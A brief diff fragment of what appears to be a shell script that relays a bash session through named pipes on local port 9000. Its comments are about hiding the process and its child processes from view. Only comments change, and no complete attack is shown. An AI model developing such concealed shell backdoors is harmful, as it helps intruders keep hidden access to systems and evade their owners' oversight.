@@ -5,8 +5,9 @@
 #hide this process
 localPort=9000
 
-#assumes module is install first
+#assumes module is install first e,g, if a command is run from shell it needs to be hidden.
 
+#TODO: hide child processe
 
 mkfifo fromBash
 mkfifo toBash
